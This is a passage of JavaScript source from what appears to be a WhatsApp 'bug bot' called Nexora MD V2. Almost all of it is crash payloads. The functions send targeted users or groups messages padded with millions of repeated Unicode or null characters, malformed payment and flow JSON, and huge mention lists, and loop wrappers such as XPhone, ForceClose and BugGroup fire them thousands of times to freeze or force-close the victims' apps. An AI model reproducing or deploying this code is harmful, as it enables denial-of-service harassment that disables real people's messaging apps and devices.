                    "𝚾 - 𝐀𝐩𝐨𝐥𝐥𝐨 𝐒𝐩𝐚𝐜𝐞   ༘‣" +
                    "؂ن؃؄ٽ؂ن؃".repeat(10000),
                publisher:
                    "𝚾 - 𝐀𝐩𝐨𝐥𝐥𝐨 𝐒𝐩𝐚𝐜𝐞   ༘‣" +
                    "؂ن؃؄ٽ؂ن؃".repeat(10000),

                stickers: [
                    {
                        fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    }
                ],

                fileLength: "999999",
                fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
                fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
                mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",

                directPath:
                    "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",

                contextInfo: {},

                packDescription:
                    "𝚾 - 𝐀𝐩𝐨𝐥𝐥𝐨 𝐒𝐩𝐚𝐜𝐞 ༘‣" +
                    "؂ن؃؄ٽ؂ن؃".repeat(10000),

                mediaKeyTimestamp: "1741150286",
                trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",

                thumbnailDirectPath:
                    "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",

                thumbnailSha256:
                    "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",

                thumbnailEncSha256:
                    "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",

                thumbnailHeight: 252,
                thumbnailWidth: 252,

                imageDataHash:
                    "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",

                stickerPackSize: "999999999",
                stickerPackOrigin: "1"
            }
        }, { participant: { jid: target }});
    }
    
async function IosVisibleExp(empire, target) {
    const TrashIosx =
        ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ " +
        "𑇂𑆵𑆴𑆿";

    await empire.sendMessage(
        target,
        {
            text: "👁‍🗨⃟꙰。⃝𝐀𝐩𝐨𝐥𝐥𝐨 ‌ ‌⃰ ⌁ 𝐅𝐯𝐜𝐤𝐞𝐫.ꪸ⃟‼️ ✩ > https://t.me/xrelly" + TrashIosx + "𑇂𑆵𑆴𑆿".repeat(15000),
            contextInfo: {
                externalAdReply: {
                    title:
                        "({[🧪⃟꙰。⃝𝐀𝐩𝐨𝐥𝐥𝐨 ‌ ‌⃰ ⌁ 𝐅𝐯𝐜𝐤𝐞𝐫.ꪸ⃟‼️✩ ▻ ]})" +
                        "𑇂𑆵𑆴𑆿".repeat(15000),

                    body:
                        `🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰ𝘅𝗿𝗹.𝛆𝛘𞥆𝛆 ✩ ▻` +
                        TrashIosx +
                        "𑇂𑆵𑆴𑆿".repeat(15000),

                    previewType: "PHOTO",
                    remoteJid: "X",
                    conversionSource: " X ",
                    conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                    conversionDelaySeconds: 10,
                    forwardingScore: 9999999,
                    isForwarded: true,

                    quotedAd: {
                        advertiserName: " X ",
                        mediaType: "IMAGE",
                        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                        caption: " X "
                    },

                    placeholderKey: {
                        remoteJid: "0@s.whatsapp.net",
                        fromMe: false,
                        id: "ABCDEF1234567890"
                    },

                    thumbnail: null,
                    sourceUrl: "https://xnxx.com"
                }
            }
        }
    );
}

async function kresjandaotax(empire, target) {
  for (let i = 0; i < 20; i++) {
    let push = [];
    let buttt = [];

    for (let i = 0; i < 20; i++) {
      buttt.push({
        "name": "galaxy_message",
        "buttonParamsJson": JSON.stringify({
          "header": "ꦽ".repeat(1000000),
          "body": "ꦽ".repeat(100090),
          "flow_action": "navigate",
          "flow_action_payload": { "screen": "FORM_SCREEN" },
          "flow_cta": "Grattler",
          "flow_id": "1169834181134583",
          "flow_message_version": "3",
          "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
        })
      });
    }

    for (let i = 0; i < 10; i++) {
      push.push({
        "body": {
          "text": "⌭ɪᴍ ʜᴇʀᴇ ʙʀᴏ¿?"
        },
        "header": { 
          "title": "⦸ ʟᴏɴᴛᴇ sᴘᴇᴋ ᴋᴇʀᴀs" + "ꦽ".repeat(500000),
          "hasMediaAttachment": false,
          "videoMessage": {
            "url": "https://mmg.whatsapp.net/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc?ccb=11-4&oh=01_Q5Aa2QHb3h9aN3faY_F2h3EFoAxMO_uUEi2dufCo-UoaXhSJHw&oe=68CD23AB&_nc_sid=5e03e0&mms3=true",
            "mimetype": "video/mp4",
            "fileSha256": "IL4IFl67c8JnsS1g6M7NqU3ZSzwLBB3838ABvJe4KwM=",
            "fileLength": "9999999999999999",
            "seconds": 9999,
            "mediaKey": "SAlpFAh5sHSHzQmgMGAxHcWJCfZPknhEobkQcYYPwvo=",
            "height": 9999,
            "width": 9999,
            "fileEncSha256": "QxhyjqRGrvLDGhJi2yj69x5AnKXXjeQTY3iH2ZoXFqU=",
            "directPath": "/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc?ccb=11-4&oh=01_Q5Aa2QHb3h9aN3faY_F2h3EFoAxMO_uUEi2dufCo-UoaXhSJHw&oe=68CD23AB&_nc_sid=5e03e0",
            "mediaKeyTimestamp": "1755691703",
            "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACIASAMBIgACEQEDEQH/xAAuAAADAQEBAAAAAAAAAAAAAAAAAwQCBQEBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAIaZr4ffxlt35+Wxm68MqyQzR1c65OiNLWF2TJHO2GNGAq8BhpcGpiQ65gnDF6Av/8QAJhAAAgIBAwMFAAMAAAAAAAAAAQIAAxESITEEE0EQFCIyURUzQv/aAAgBAQABPwAag5/1EssTAfYZn8jjAxE6mlgPlH6ipPMfrR4EbqHY4gJB43nuCSZqAz4YSpntrIsQEY5iV1JkncQNWrHczuVnwYhpIy2YO2v1IMa8A5aNfgnQuBATccu0Tu0n4naI5tU6kxK6FOdxPbN+bS2nTwQTNDr5ljfpgcg8wZlNrbDEqKBBnmK66s5E7qmWWjPAl135CxJ3PppHbzjxOm/sjM2thmVfUxuZZxLYfT//xAAcEQACAgIDAAAAAAAAAAAAAAAAARARAjESIFH/2gAIAQIBAT8A6Wy2jlNHpjtD1P8A/8QAGREAAwADAAAAAAAAAAAAAAAAAAERICEw/9oACAEDAQE/AIRmycHh/9k=",
            "streamingSidecar": "qe+/0dCuz5ZZeOfP3bRc0luBXRiidztd+ojnn29BR9ikfnrh9KFflzh6aRSpHFLATKZL7lZlBhYU43nherrRJw9WUQNWy74Lnr+HudvvivBHpBAYgvx07rDTRHRZmWx7fb1fD7Mv/VQGKRfD3ScRnIO0Nw/0Jflwbf8QUQE3dBvnJ/FD6In3W9tGSdLEBrwsm1/oSZRl8O3xd6dFTauD0Q4TlHj02/pq6888pzY00LvwB9LFKG7VKeIPNi3Szvd1KbyZ3QHm+9TmTxg2ga4s9U5Q",
            "scanLengths": [
              247,
              201,
              73,
              63
            ],
            "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
          }
        },
        "nativeFlowMessage": {
          "buttons": []
        }
      });
    }

    const carousel = generateWAMessageFromContent(target, {
      "viewOnceMessage": {
        "message": {
          "messageContextInfo": {
            "deviceListMetadata": {},
            "deviceListMetadataVersion": 2
          },
          "interactiveMessage": {
            "body": {
              "text": "⩝ɪᴍ ᴀʟᴏɴᴇ" + "ꦽ".repeat(500000)
            },
            "footer": {
              "text": "∅ ᴅɪʟᴀʀᴀɴɢ ᴋᴇʟᴜᴀʀ"
            },
            "header": {
              "hasMediaAttachment": false
            },
            "carouselMessage": {
              "cards": [
                ...push
              ]
            }
          }
        }
      }
    }, {});

    await empire.relayMessage(target, carousel.message, {
      "messageId": carousel.key.id,
      participant: { jid: target }
    });
  }
}

async function LocaCrashUi2(empire, target) {
console.log(chalk.red(`𝗗𝗲𝘄𝗮 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
  const otaxx = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
  locationMessage: {
          degreesLatitude: 11.11,
          degreesLongitude: -11.11,
          name: "DO YOU KNOW ME?¿ GUPONG" + "ꦽ".repeat(600000),
          url: "https://t.me/GupongShop",
          contextInfo: {
            externalAdReply: {
              quotedAd: {
                advertiserName: "ꦾ".repeat(600000),
                mediaType: "IMAGE",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                caption: "οταϰ ιѕ нєяє"
              },
              placeholderKey: {
                remoteJid: "0@g.us",
                fromMe: true,
                id: "ABCDEF1234567890"
              }
            }
          }
        },
            hasMediaAttachment: true
          },
          body: {
            text: "нαιι ιм οταϰ⸙"
          },
          nativeFlowMessage: {
            messageParamsJson: "{[",
            messageVersion: 3,
            buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },           
                {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                    "icon": "RIVIEW",
                    "flow_cta": "ꦽ".repeat(10000),
                    "flow_message_version": "3"
                })
              },      
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                    "icon": "RIVIEW",
                    "flow_cta": "ꦾ".repeat(10000),
                    "flow_message_version": "3"
                })
              },  
            ]
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, proto.Message.fromObject(otaxx), { userJid: target });
  await empire.relayMessage(target, msg.message, { messageId: msg.key.id });
  
  await new Promise(r => setTimeout(r, 500));

  await empire.sendMessage(target, {
    delete: {
      fromMe: true,
      remoteJid: target,
      id: msg.key.id
    }
  });
}
    
async function crashGP(target) {
await empire.relayMessage(target, {
  "interactiveMessage": {
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "review_and_pay",
          "buttonParamsJson": `{\"currency\":\"IDR\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":800,\"offset\":100},\"reference_id\":\"4TU82OG2957\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"description\":\"\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-2c7378a6-1643-4dba-8b2d-23e556a81ad4\",\"name\":\"${'\u0000'.repeat(50000)}\",\"amount\":{\"value\":800,\"offset\":100},\"quantity\":1}]},\"additional_note\":\"xtx\",\"native_payment_methods\":[],\"share_payment_status\":false}`
          }
        ]
      }
    }
  }, {});
}  

async function HyperSixty(target, mention) {
  try {
    const Node = "𑇂𑆵𑆴𑆿";
    const metaNode = [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }];

    const locationMessage = {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "\u0000" + Node.repeat(1150000),
      address: "\u0000" + Node.repeat(100000),
      url: `${Node.repeat(250000)}.com`
    };

    const extendMsg = {
      extendedTextMessage: {
        text: "X",
        matchedText: "",
        description: Node.repeat(25000),
        title: Node.repeat(15000),
        previewType: "NONE",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/OLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
        thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc",
        thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
        thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
        mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
        mediaKeyTimestamp: "1743101489",
        thumbnailHeight: 641,
        thumbnailWidth: 640,
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    };

    const makeMsg = content =>
      generateWAMessageFromContent(
        target,
        { viewOnceMessage: { message: content } },
        {}
      );

    const msg1 = makeMsg({ locationMessage });
    const msg2 = makeMsg(extendMsg);
    const msg3 = makeMsg({ locationMessage });

    for (const m of [msg1, msg2, msg3]) {
      await empire.relayMessage("status@broadcast", m.message, {
        messageId: m.key.id,
        statusJidList: [target],
        additionalNodes: metaNode
      });
    }

  } catch (e) {
    console.error(e);
  }
}
    
async function Xtended(empire, target) {
         try {
          const locationMessage = {
           degreesLatitude: -9.099999262999,
           degreesLongitude: 199.999631718999,
           jpegThumbnail: null,
           name: "X" + "𑇂𑆵𑆴𑆿".repeat(150000),
           address: "X" + "𑇂𑆵𑆴𑆿".repeat(500000),
           url: `${"𑇂𑆵𑆴𑆿".repeat(2500000)}.com`,
          }
          
          const msg = generateWAMessageFromContent(target, {
                    viewOnceMessage: {
                        message: { locationMessage }
                    }
                }, {});
          
          await empire.relayMessage('status@broadcast', msg.message, {
           messageId: msg.key.id,
           statusJidList: [target],
           additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
             tag: 'mentioned_users',
             attrs: {},
             content: [{
              tag: 'to',
              attrs: { jid: target },
              content: undefined
             }]
            }]
           }]
          });
         } catch (err) {
          console.error(err);
         }
        };
        
async function glorymessage(target, cta = true) {
  let msg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length: 20000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`),
        isForwarded: true,
        forwardingScore: 7205,
        expiration: 0
      },
      body: { text: "Xata", format: "DEFAULT" },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(9000000)}\"}}`,
        version: 3
      }
    }
  }, {});

  await empire.relayMessage(target, {
    groupStatusMessageV2: { message: msg.message }
  }, cta ? { messageId: msg.key.id, participant: { jid: target } } : { messageId: msg.key.id });

  let msg2 = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`),
        isForwarded: true,
        forwardingScore: 7205,
        expiration: 0
      },
      body: { text: "Xata", format: "DEFAULT" },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, {});

  await empire.relayMessage(target, {
    groupStatusMessageV2: { message: msg2.message }
  }, cta ? { messageId: msg2.key.id, participant: { jid: target } } : { messageId: msg2.key.id });
}
    
async function invisibleSpam(empire, target) {
  for (let i = 0; i < 1; i++) {
    const msg = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "\u0003",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: "\x10".repeat(1000000),
                version: 3
              }
            }
          }
        }
      },
      {
        participant: { jid: target }
      }
    );
    await empire.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: msg.message
        }
      },
      {
        messageId: msg.key.id,
        participant: { jid: target }
      }
    );
  }
  await new Promise(resolve => setTimeout(resolve, 1000));
}
    
//FUNCTION LOGIKA MENU JANGAN HAPUS //===
async function propoversGroups(target) {
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
          contextInfo: {
          expiration: 1,
          ephemeralSettingTimestamp: 1,
          entryPointConversionSource: "WhatsApp.com",
          entryPointConversionApp: "WhatsApp",
          entryPointConversionDelaySeconds: 1,
          disappearingMode: {
            initiatorDeviceJid: target,
            initiator: "INITIATED_BY_OTHER",
            trigger: "UNKNOWN_GROUPS"
          },
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: null
              }
            },
            externalAdReply: {
              showAdAttribution: true,
              renderLargerThumbnail: true
            }
          },
            body: {
              text: "𝘇𝗮𝗹𝗹 𝐊𝐢𝐥𝐥 𝐆𝐫𝐨𝐮𝐩",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                     status: true,
                     criador: "𝘇𝗮𝗹𝗹 𝐊𝐢𝐥𝐥 𝐆𝐫𝐨𝐮𝐩",
                     versao: "@latest",
                     atualizado: "2025-04-15",
                     suporte: "https://wa.me/6281572074859",
                     comandosDisponiveis: [`${command}`],
                     prefixo: `${prefix}`,
                     linguagem: "id"
                  }) + "𝘇𝗮𝗹𝗹 𝐊𝐢𝐥𝐥 𝐆𝐫𝐨𝐮𝐩"
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({ 
                  status: true,
                     criador: "𝘇𝗮𝗹𝗹 𝐊𝐢𝐥𝐥 𝐆𝐫𝐨𝐮𝐩",
                     versao: "@latest",
                     atualizado: "2025-04-15",
                     suporte: "https://wa.me/6281572074859",
                     comandosDisponiveis: [`${command}`],
                     prefixo: `${prefix}`,
                     linguagem: "id"
                  }) + "𝘇𝗮𝗹𝗹 𝐊𝐢𝐥𝐥 𝐆𝐫𝐨𝐮𝐩"
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await empire.relayMessage(target, msg.message, {
    messageId: msg.key.id
  });
}
 
        
        async function bug3(isTarget) {
            for (let i = 0; i < 600; i++) {
                await killgc(isTarget);
                await rusuhgc(isTarget);
                await blankgc(isTarget);
            }
            console.log(chalk.blue(`Sending Crash Hard to ${isTarget}☠️`));
        }
        // 𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2E //
        //FUNCT BUG GROUP VAMPIRE, #THANKS VAMP   
        async function VampireBugIns(target) {
            try {
                const message = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: `33333333333333333@newsletter`,
                                newsletterName: "*NEXORA KILL YOU 🩸*" + "ꦾ".repeat(120000),
                                jpegThumbnail: "",
                                caption: "ꦽ".repeat(1200000) + "@0".repeat(120000),
                                inviteExpiration: Date.now() + 1814400000, // 21 hari
                            },
                        },
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "",
                        buttons: [
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "{}",
                            },
                            {
                                name: "galaxy_message",
                                paramsJson: {
                                    "screen_2_OptIn_0": true,
                                    "screen_2_OptIn_1": true,
                                    "screen_1_Dropdown_0": "nullOnTop",
                                    "screen_1_DatePicker_1": "1028995200000",
                                    "screen_1_TextInput_2": "null@gmail.com",
                                    "screen_1_TextInput_3": "94643116",
                                    "screen_0_TextInput_0": "\u0000".repeat(500000),
                                    "screen_0_TextInput_1": "SecretDocu",
                                    "screen_0_Dropdown_2": "#926-Xnull",
                                    "screen_0_RadioButtonsGroup_3": "0_true",
                                    "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                },
                            },
                        ],
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [
                            {
                                groupJid: "0@s.whatsapp.net",
                                groupSubject: "Vampire",
                            },
                        ],
                    },
                };

                await empire.relayMessage(target, message, {
                    userJid: target,
                });
            } catch (err) {
                console.error("Error sending newsletter:", err);
            }
        }

        // ============ BLANK GROUP FUNCTION ============
        async function BlankGroup(target) {
            try {
                console.log(chalk.blue(`🎯 Starting BlankGroup attack on ${target}`));

                // Run multiple group bug functions
                await blankgc(target);
                await sleep(1500);

                await BugGb1(target);
                await sleep(1500);

                await BugGb12(target);
                await sleep(1500);

                await rusuhgc(target);
                await sleep(1500);

                console.log(chalk.green(`✅ BlankGroup attack completed on ${target}`));
            } catch (err) {
                console.error("BlankGroup error:", err.message);
            }
        }

        async function VampireGroupInvis(target, ptcp = true) {
            try {
                const message = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: `33333333333333333@newsletter`,
                                newsletterName: "*Nexora killed you🩸" + "ꦾ".repeat(120000),
                                jpegThumbnail: "",
                                caption: "ꦽ".repeat(1200000) + "@9".repeat(120000),
                                inviteExpiration: Date.now() + 1814400000, // 21 hari
                            },
                        },
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "",
                        buttons: [
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "{}",
                            },
                            {
                                name: "galaxy_message",
                                paramsJson: {
                                    "screen_2_OptIn_0": true,
                                    "screen_2_OptIn_1": true,
                                    "screen_1_Dropdown_0": "nullOnTop",
                                    "screen_1_DatePicker_1": "1028995200000",
                                    "screen_1_TextInput_2": "null@gmail.com",
                                    "screen_1_TextInput_3": "94643116",
                                    "screen_0_TextInput_0": "\u0018".repeat(50000),
                                    "screen_0_TextInput_1": "SecretDocu",
                                    "screen_0_Dropdown_2": "#926-Xnull",
                                    "screen_0_RadioButtonsGroup_3": "0_true",
                                    "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                },
                            },
                        ],
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [
                            {
                                groupJid: "0@s.whatsapp.net",
                                groupSubject: "Vampire Official",
                            },
                        ],
                    },
                };

                await empire.relayMessage(target, message, {
                    userJid: target,
                });
            } catch (err) {
                console.error("Error sending newsletter:", err);
            }
        }
        // ============ IOS OVER FUNCTION (FIXED) ============
        
        async function iosOver(durationHours, XS) {
            console.log(chalk.yellow('⚠️ iosOver function is starting...'));

            // If you 𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2't have XiosVirus and TrashLocIOS, just use existing functions
            const totalDurationMs = durationHours * 60 * 60 * 1000;
            const startTime = Date.now();
            let count = 0;
            let batch = 1;
            const maxBatches = 3; // Reduced for safety

            const sendNext = async () => {
                // Check time limit
                if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
                    console.log(chalk.green(`✅ iosOver complete! Total batches: ${batch - 1}`));
                    return;
                }

                try {
                    if (count < 100) {
                        // Use existing bug functions instead of undefined ones
                        await forclose(XS);
                        await sleep(500);
                        await ForceXFrezee(XS);
                        await sleep(500);
                        

                        console.log(chalk.yellow(`${count + 1}/100 completed for ${XS}`));
                        count++;

                        setTimeout(sendNext, 800);
                    } else {
                        console.log(chalk.green(`✅ Batch ${batch} completed`));

                        if (batch < maxBatches) {
                            console.log(chalk.yellow(`Waiting 2 minutes...`));
                            count = 0;
                            batch++;
                            setTimeout(sendNext, 2 * 60 * 1000);
                        }
                    }
                } catch (error) {
                    console.error(`❌ Error: ${error.message}`);
                    setTimeout(sendNext, 2000);
                }
            };

            sendNext();
        }



        // ================= ( Combo Function )====================
        async function Combo(target) {
            for (let i = 0; i < 1000; i++) {
               
                await ForceXFrezee(target);
                await blank1(target);
               
                await ForceXFrezee(target);
                await blank1(target);
               
                await ForceXFrezee(target);
                await blank1(target);
               
                await ForceXFrezee(target);
                await blank1(target);
               
                await ForceXFrezee(target);
                await blank1(target);
              // 
                await ForceXFrezee(target);
                await blank1(target);

            }
        }

        async function fcnew(target) {
            for (let i = 0; i < 1000; i++) {
                await CarouselVY4(empire, target);
                await CarouselVY4(empire, target);
                await LocaXotion(target);
                await XinsooInvisV1(target);
                await CarouselVY4(empire, target);
                await CarouselVY4(empire, target);
                await LocaXotion(target);
                await XinsooInvisV1(target);
                await CarouselVY4(empire, target);
                await CarouselVY4(empire, target);
                await LocaXotion(target);
                await XinsooInvisV1(target);
                await CarouselVY4(empire, target);
                await CarouselVY4(empire, target);
                await LocaXotion(target);
                await XinsooInvisV1(target);
                await CarouselVY4(empire, target);
                await CarouselVY4(empire, target);
                await LocaXotion(target);
                await XinsooInvisV1(target);

            }
        }


        async function BugGroup(target) {
            for (let i = 0; i < 200; i++) {
                await BugGb1(m.chat);
                await BugGb12(m.chat, ptcp = true);
                await DelayGroup(m.chat);
                await xgroupnulL(m.chat);
                await BugGb1(target);
                await BugGb12(target, ptcp = true);
                await DelayGroup(m.chat);
                await xgroupnulL(m.chat);
                await BugGb1(m.chat);
                await BugGb12(target, ptcp = true);
                await DelayGroup(m.chat);
                await xgroupnulL(m.chat);
                await BugGb1(m.chat);
                await BugGb12(target, ptcp = true);
                await DelayGroup(m.chat);
                await xgroupnulL(m.chat);
                await BugGb1(m.chat);
                await BugGb12(target, ptcp = true);
                await DelayGroup(m.chat);
                await xgroupnulL(m.chat);
                await BlankGroup(m.chat);


            }

        }

        async function BayuOfficialHard(target) {
            for (let i = 0; i < 200; i++) {
                await protoXimg(target)
                await bulldozer(target)
                await protocolbug3(target)
                await bulldozer(target)
                await delayMakerInvisible(target)
                await bulldozer(target)
                await xatanicinvisv4(target)
                await bulldozer(target)
                await protocolbug6(target)
            }
        }

        async function ForceClose(target) {
            for (let i = 0; i < 250; i++) {
                await forclose(target);
                await forclose(target);
                await forclose(target);
                await forclose(target);
                await forclose(target);
                await forclose(target);
                await forclose(target);
                await forclose(target);
                await forclose(target);
                await forclose(target);
                await forclose(target);
                await forclose(target);
                await forclose(target);
                await forclose(target);
                await forclose(target);

            }

        }

        async function XPhone(target) {
            for (let i = 0; i < 3000; i++) {  // ✅ CORRECT - lowercase i

                await CarouselVY4(empire, target);
                await CrashLoadIos(empire, target);
                await forclose(target);
                await LocaXotion(target);
                await XinsooInvisV1(target);
                await Xblanknoclick(target);
                await ForceXFrezee(target);
                await blank1(target);
             //  

            }


        }
        // ================= ( Bates Function )=====================
        async function doneress() {
            if (!text) throw "❌ Target information required";

            let pepec = args[0].replace(/[^0-9]/g, "");
            let thumbnailUrl = "https://o.uguu.se/iRcJMsdi.jpg";

            let ressdone = `
*𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2 — Operation Complete*

▸ Type: ${command}
▸ Target: ${pepec}

System requires a 10-minute cooldown before next operation.
`;

            await empire.sendMessage(m.chat, {
                image: { url: thumbnailUrl },
                caption: ressdone,
                gifPlayback: true,
                gifAttribution: 1,
                contextInfo: {
                    mentionedJid: [m.sender],
                    externalAdReply: {
                        showAdAttribution: false,
                        title: "𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗗 𝗩2 — Bug System",
                        body: "Operation Complete",
